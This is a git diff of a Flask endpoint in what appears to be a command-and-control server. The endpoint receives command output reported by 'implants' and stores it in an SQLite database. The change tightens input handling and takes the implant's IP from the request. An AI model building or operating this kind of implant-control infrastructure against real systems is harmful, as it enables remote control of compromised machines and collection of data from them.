@@ -116,13 +116,12 @@ def get_peers():
 
 
 """
-Receive the report of results from the implant, lowkey it floods the server but its fine because we are filtering stuff and saving only one result per command per implant
+Receive the report of results from the implants
 """
 @implants_blueprint.route("/report", methods=["POST"])
 def report():
     payload = request.get_json() or {}
     bulk    = payload.get("results")
-    reporter_ip = request.remote_addr
 
     if not bulk or not isinstance(bulk, list):
         return jsonify({"message": "No results provided"}), 400
@@ -131,13 +130,14 @@ def report():
         conn = sqlite3.connect('c2.db')
         cursor = conn.cursor()
 
-        ingested = 0
         for r in bulk:
-            cmd_id  = r.get("command_id")
+            cmd_id  = r.get("cmd_id")
             output  = r.get("output", "")
             ts      = r.get("timestamp", datetime.datetime.now().isoformat())
-            ip      = r.get("implant_ip") or reporter_ip
+            ip      = request.remote_addr
 
+            if not isinstance(cmd_id, int) or not isinstance(output, str):
+                continue
 
             cursor.execute("SELECT id FROM implants WHERE ip = ?", (ip,))
             row = cursor.fetchone()
@@ -152,7 +152,6 @@ def report():
                   (command_id, implant_id, output, received_at)
                 VALUES (?, ?, ?, ?)
             """, (cmd_id, implant_id, output, ts))
-            ingested += cursor.rowcount  # 1 if inserted, 0 if ignored ig
 
         conn.commit()
         conn.close()
@@ -161,5 +160,5 @@ def report():
         print(f"⚠️ SQLite ERROR inserting results - {e}")
         return jsonify({"message": str(e)}), 500
 
-    print(f"📥 - Received {len(bulk)} results from {reporter_ip}, ingested {ingested} new entries")
-    return jsonify({"message": "ok", "ingested": ingested}), 200
+    print(f"📥 - Received {len(bulk)} results from {request.remote_addr}")
+    return jsonify({"message": "ok"}), 200
